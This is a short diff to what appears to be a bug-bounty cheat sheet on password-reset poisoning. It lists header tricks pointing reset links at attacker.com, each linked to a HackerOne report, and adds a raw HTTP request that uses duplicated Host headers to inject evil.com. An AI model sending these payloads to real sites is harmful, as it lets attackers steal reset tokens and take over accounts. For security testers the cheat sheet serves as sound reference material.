@@ -12,3 +12,8 @@
     - Change Referer → Referer: attacker.com [Report](https://hackerone.com/reports/229498)
     - Redirect X-Forwarded-Host (whitelist) → X-Forwarded-Host: attacker.com/.site.com [Report](https://hackerone.com/reports/698416)
     - Change Path URI → GET https://attacker.com/forget-pass [Report](https://hackerone.com/reports/158482)
+
+POST /reset-password HTTP/1.1
+ Host: Site.com
+Host: evil.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
